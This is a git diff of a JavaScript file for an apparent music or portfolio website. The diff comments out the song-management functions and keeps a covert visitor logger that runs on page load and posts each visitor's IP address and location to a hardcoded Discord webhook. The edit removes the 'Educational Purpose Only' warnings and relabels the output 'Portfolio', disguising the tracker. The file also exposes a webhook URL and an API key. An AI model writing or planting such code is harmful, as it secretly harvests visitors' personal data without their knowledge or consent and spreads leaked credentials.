@@ -1,102 +1,102 @@
 // Toggle Add Music Form
-function toggleAddMusicForm() {
-    const form = document.getElementById('addMusicForm');
-    form.style.display = form.style.display === 'none' ? 'block' : 'none';
-}
+//function toggleAddMusicForm() {
+//    const form = document.getElementById('addMusicForm');
+//    form.style.display = form.style.display === 'none' ? 'block' : 'none';
+//}
 
 // Add New Music
-function addNewMusic() {
-    // Get form values
-    const title = document.getElementById('songTitle').value;
-    const artist = document.getElementById('artist').value;
-    const album = document.getElementById('album').value;
-    const duration = document.getElementById('duration').value;
-    const coverUrl = document.getElementById('coverUrl').value || './images/cas.png'; // Default image if none provided
-
-    // Find the artist section or create new one
-    let artistSection = findOrCreateArtistSection(artist);
-    
-    // Get the song grid
-    const songGrid = artistSection.querySelector('.song-grid');
-    
-    // Get the current number of songs
-    const songCount = songGrid.querySelectorAll('.song-item').length;
-
-    // Create new song item
-    const songItem = createSongItem(songCount + 1, title, artist, album, duration, coverUrl);
-    
-    // Add the new song to the grid
-    songGrid.appendChild(songItem);
-
-    // Clear form and hide it
-    clearForm();
-    toggleAddMusicForm();
-}
+//function addNewMusic() {
+//    // Get form values
+//    const title = document.getElementById('songTitle').value;
+//    const artist = document.getElementById('artist').value;
+//    const album = document.getElementById('album').value;
+//    const duration = document.getElementById('duration').value;
+//    const coverUrl = document.getElementById('coverUrl').value || './images/cas.png'; 
+//
+//    // Find the artist section or create new one
+//    let artistSection = findOrCreateArtistSection(artist);
+//    
+//    // Get the song grid
+//    const songGrid = artistSection.querySelector('.song-grid');
+//    
+//    // Get the current number of songs
+//    const songCount = songGrid.querySelectorAll('.song-item').length;
+//
+//    // Create new song item
+//    const songItem = createSongItem(songCount + 1, title, artist, album, duration, coverUrl);
+//    
+//    // Add the new song to the grid
+//    songGrid.appendChild(songItem);
+//
+//    // Clear form and hide it
+//    clearForm();
+//    toggleAddMusicForm();
+//}
 
 // Find or Create Artist Section
-function findOrCreateArtistSection(artistName) {
-    let artistSection = Array.from(document.querySelectorAll('.artist-section')).find(section => 
-        section.querySelector('.favtext h1').textContent.trim() === artistName
-    );
-
-    if (!artistSection) {
-        // Create new artist section
-        artistSection = document.createElement('div');
-        artistSection.className = 'artist-section';
-        artistSection.innerHTML = `
-            <div class="favtext">
-                <h1>${artistName}</h1>
-                <b class="favdesc">Songs</b>
-            </div>
-            <div class="whiteline"></div>
-            <div class="song-grid"></div>
-        `;
-
-        // Add to artists container
-        document.querySelector('.artists-container').appendChild(artistSection);
-    }
-
-    return artistSection;
-}
+//function findOrCreateArtistSection(artistName) {
+//    let artistSection = Array.from(document.querySelectorAll('.artist-section')).find(section => 
+//        section.querySelector('.favtext h1').textContent.trim() === artistName
+//    );
+//
+//    if (!artistSection) {
+//        // Create new artist section
+//        artistSection = document.createElement('div');
+//        artistSection.className = 'artist-section';
+//        artistSection.innerHTML = `
+//            <div class="favtext">
+//                <h1>${artistName}</h1>
+//                <b class="favdesc">Songs</b>
+//            </div>
+//            <div class="whiteline"></div>
+//            <div class="song-grid"></div>
+//        `;
+//
+//        // Add to artists container
+//        document.querySelector('.artists-container').appendChild(artistSection);
+//    }
+//
+//    return artistSection;
+//}
 
 // Create Song Item
-function createSongItem(number, title, artist, album, duration, coverUrl) {
-    const div = document.createElement('div');
-    div.className = 'song-item';
-    const songId = `song-${artist.replace(/\s+/g, '-')}-${title.replace(/\s+/g, '-')}`.toLowerCase();
-    div.innerHTML = `
-        <div class="song-number">${number}</div>
-        <div class="song-image-container">
-            <img src="${coverUrl}" alt="${title}" class="song-image"/>
-            <div class="play-button" onclick="playSong('${songId}')">
-                <i class="fa-solid fa-play"></i>
-            </div>
-        </div>
-        <div class="song-info">
-            <div class="song-name">${title}</div>
-            <div class="song-artist">${artist}</div>
-        </div>
-        <div class="song-album">${album}</div>
-        <div class="song-duration">${duration}</div>
-        <div class="music-visualizer">
-            <div class="music-bar"></div>
-            <div class="music-bar"></div>
-            <div class="music-bar"></div>
-            <div class="music-bar"></div>
-        </div>
-        <audio id="${songId}" src="musics/${artist}/${title}.mp3"></audio>
-    `;
-    return div;
-}
+//function createSongItem(number, title, artist, album, duration, coverUrl) {
+//    const div = document.createElement('div');
+//    div.className = 'song-item';
+//    const songId = `song-${artist.replace(/\s+/g, '-')}-${title.replace(/\s+/g, '-')}`.toLowerCase();
+//    div.innerHTML = `
+//        <div class="song-number">${number}</div>
+//        <div class="song-image-container">
+//            <img src="${coverUrl}" alt="${title}" class="song-image"/>
+//            <div class="play-button" onclick="playSong('${songId}')">
+//                <i class="fa-solid fa-play"></i>
+//            </div>
+//        </div>
+//        <div class="song-info">
+//            <div class="song-name">${title}</div>
+//            <div class="song-artist">${artist}</div>
+//        </div>
+//        <div class="song-album">${album}</div>
+//        <div class="song-duration">${duration}</div>
+//        <div class="music-visualizer">
+//            <div class="music-bar"></div>
+//            <div class="music-bar"></div>
+//            <div class="music-bar"></div>
+//            <div class="music-bar"></div>
+//        </div>
+//        <audio id="${songId}" src="musics/${artist}/${title}.mp3"></audio>
+//    `;
+//    return div;
+//}
 
 // Clear Form
-function clearForm() {
-    document.getElementById('songTitle').value = '';
-    document.getElementById('artist').value = '';
-    document.getElementById('album').value = '';
-    document.getElementById('duration').value = '';
-    document.getElementById('coverUrl').value = '';
-}
+//function clearForm() {
+//    document.getElementById('songTitle').value = '';
+//    document.getElementById('artist').value = '';
+//    document.getElementById('album').value = '';
+//    document.getElementById('duration').value = '';
+//    document.getElementById('coverUrl').value = '';
+//}
 
 // Current playing audio element
 let currentlyPlaying = null;
@@ -180,34 +180,30 @@ function playSong(audioId, audioSrc) {
 }
 
 // Play all songs in a section
-function playAllSongs(artistId) {
-    const artistSection = document.querySelector(`[data-artist-id="${artistId}"]`);
-    if (!artistSection) return;
-
-    const audioElements = artistSection.querySelectorAll('audio');
-    let currentIndex = 0;
-
-    function playNext() {
-        if (currentIndex < audioElements.length) {
-            const audio = audioElements[currentIndex];
-            audio.play();
-            currentIndex++;
-            audio.onended = playNext;
-        }
-    }
-
-    playNext();
-}
+//function playAllSongs(artistId) {
+//    const artistSection = document.querySelector(`[data-artist-id="${artistId}"]`);
+//    if (!artistSection) return;
+//
+//    const audioElements = artistSection.querySelectorAll('audio');
+//    let currentIndex = 0;
+//
+//    function playNext() {
+//        if (currentIndex < audioElements.length) {
+//            const audio = audioElements[currentIndex];
+//            audio.play();
+//            currentIndex++;
+//            audio.onended = playNext;
+//        }
+//    }
+//
+//    playNext();
+//}
 
 
 //Webhook IP
-
-// IP Logger with Discord Webhook - Educational Purpose Only
-// Replace with your actual Discord webhook URL
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1397165010702172180/fEOUreMdx4Q7oGebxqlveBZOL4brnQ9VxpUIwwKysvTGeq70GHMWiTSuH4Hw0_Us5ppg';
 const API_KEY = 'a4b4abd805edfe3e4e0e6a91f922efa4';
 
-// Function to get visitor's IP and location data
 async function logVisitor() {
     try {
         // First, get the visitor's IP address
@@ -267,7 +263,7 @@ async function logVisitor() {
                 }
             ],
             footer: {
-                text: "Educational Purpose Only - Remove After Testing",
+                text: "Portfolio",
                 icon_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
             }
         };
@@ -326,7 +322,6 @@ async function logVisitor() {
     }
 }
 
-// Function to check if visitor should be logged (avoid duplicate logs)
 function shouldLogVisitor() {
     const lastLog = localStorage.getItem('lastIPLog');
     const now = Date.now();
@@ -339,21 +334,16 @@ function shouldLogVisitor() {
     return false;
 }
 
-// Auto-run when page loads
 document.addEventListener('DOMContentLoaded', function() {
-    // Add a small delay to ensure page is fully loaded
     setTimeout(() => {
         if (shouldLogVisitor()) {
             logVisitor();
         }
-    }, 2000);
+    }, 1000);
 });
 
-// Optional: Log when user leaves the page (for session tracking)
 window.addEventListener('beforeunload', function() {
-    // You can add additional logging here if needed
     console.log('User leaving page');
 });
 
-// Optional: Expose function globally for manual testing
 window.testIPLogger = logVisitor;
